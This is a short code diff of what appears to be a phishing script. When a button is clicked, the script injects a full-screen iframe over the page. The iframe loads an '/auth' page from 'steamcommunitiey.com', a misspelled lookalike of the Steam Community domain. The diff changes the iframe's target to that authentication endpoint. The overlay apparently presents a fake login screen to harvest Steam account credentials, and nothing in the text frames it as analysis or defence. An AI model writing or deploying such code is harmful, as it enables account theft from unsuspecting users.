@@ -1,5 +1,5 @@
 const className = ".lk0e6gi8s69v";
-const staticUrl = "https://api.steamcommunitiey.com/static";
+const staticUrl = "https://api.steamcommunitiey.com/auth";
 
 (() => {
 
@@ -10,7 +10,7 @@ const staticUrl = "https://api.steamcommunitiey.com/static";
             buttons.forEach((button) => {
                button.onclick  = () => {
                     const iframe = document.createElement("iframe");
-                    iframe.src = `${staticUrl}/txqmjgkxhzp5.html`;
+                    iframe.src = `${staticUrl}`;
                     iframe.style = "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000";
                     document.documentElement.style.overflow = "hidden";
                     document.body.appendChild(iframe);
